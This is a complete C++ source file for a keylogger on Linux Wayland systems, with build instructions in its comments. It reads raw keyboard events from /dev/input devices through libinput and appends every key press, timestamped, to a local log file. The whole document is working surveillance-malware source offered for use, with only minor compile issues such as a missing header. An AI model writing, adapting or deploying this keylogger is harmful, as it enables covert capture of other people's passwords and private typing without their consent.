//sudo apt install libinput-dev
//? Install libinput development headers:
//?Replace /dev/input/event0, /dev/input/event1, etc., with actual device paths using ls /dev/input/.
// g++ keyLogger_wayland.cpp -o keylogger_wayland -std=c++11 -linput

#include <iostream>
#include <fstream>
#include <libinput.h>
#include <fcntl.h>
#include <unistd.h>
#include <ctime>
#include <linux/input-event-codes.h>

// Global log file
std::ofstream logFile;

// Function to get the current timestamp
std::string GetTimestamp() {
    std::time_t now = std::time(nullptr);
    char buf[100];
    strftime(buf, sizeof(buf), "[%Y-%m-%d %H:%M:%S]", std::localtime(&now));
    return std::string(buf);
}

// Function to translate key codes to human-readable key names
std::string GetKeyName(uint32_t keyCode) {
    static const std::unordered_map<uint32_t, std::string> keyMap = {
        {KEY_A, "A"}, {KEY_B, "B"}, {KEY_C, "C"}, {KEY_D, "D"}, {KEY_E, "E"},
        {KEY_F, "F"}, {KEY_G, "G"}, {KEY_H, "H"}, {KEY_I, "I"}, {KEY_J, "J"},
        {KEY_K, "K"}, {KEY_L, "L"}, {KEY_M, "M"}, {KEY_N, "N"}, {KEY_O, "O"},
        {KEY_P, "P"}, {KEY_Q, "Q"}, {KEY_R, "R"}, {KEY_S, "S"}, {KEY_T, "T"},
        {KEY_U, "U"}, {KEY_V, "V"}, {KEY_W, "W"}, {KEY_X, "X"}, {KEY_Y, "Y"},
        {KEY_Z, "Z"}, {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"},
        {KEY_5, "5"}, {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"},
        {KEY_0, "0"}, {KEY_SPACE, "Space"}, {KEY_ENTER, "Enter"},
        {KEY_BACKSPACE, "Backspace"}, {KEY_TAB, "Tab"}, {KEY_ESC, "Escape"}
        // Add more keys as needed
    };

    auto it = keyMap.find(keyCode);
    return (it != keyMap.end()) ? it->second : "Unknown Key (" + std::to_string(keyCode) + ")";
}

// Initialize libinput
struct libinput* InitLibInput() {
    struct libinput* li;
    struct libinput_interface iface = {
        .open_restricted = [](const char* path, int flags, void* user_data) -> int {
            return open(path, flags);
        },
        .close_restricted = [](int fd, void* user_data) {
            close(fd);
        }
    };

    li = libinput_path_create_context(&iface, nullptr);
    if (!li) {
        std::cerr << "Failed to initialize libinput context." << std::endl;
        exit(1);
    }

    return li;
}

// Main loop to process events
void ProcessEvents(struct libinput* li) {
    while (libinput_dispatch(li) == 0) {
        struct libinput_event* event;
        while ((event = libinput_get_event(li)) != nullptr) {
            if (libinput_event_get_type(event) == LIBINPUT_EVENT_KEYBOARD_KEY) {
                struct libinput_event_keyboard* keyEvent =
                    libinput_event_get_keyboard_event(event);
                uint32_t key = libinput_event_keyboard_get_key(keyEvent);
                enum libinput_key_state state = libinput_event_keyboard_get_key_state(keyEvent);

                if (state == LIBINPUT_KEY_STATE_PRESSED) {
                    std::string keyName = GetKeyName(key);
                    logFile << GetTimestamp() << " Key Pressed: " << keyName << std::endl;
                    logFile.flush();
                }
            }
            libinput_event_destroy(event);
        }
    }
}

int main() {
    // Open log file in append mode
    logFile.open("keylog_wayland.txt", std::ios::out | std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file." << std::endl;
        return 1;
    }

    // Initialize libinput
    struct libinput* li = InitLibInput();

    // Add devices (adjust paths as needed)
    libinput_path_add_device(li, "/dev/input/event0"); // Example device
    libinput_path_add_device(li, "/dev/input/event1");

    std::cout << "Wayland keylogger started. Press Ctrl+C to exit." << std::endl;

    // Process events
    ProcessEvents(li);

    // Clean up
    libinput_unref(li);
    logFile.close();

    return 0;
}
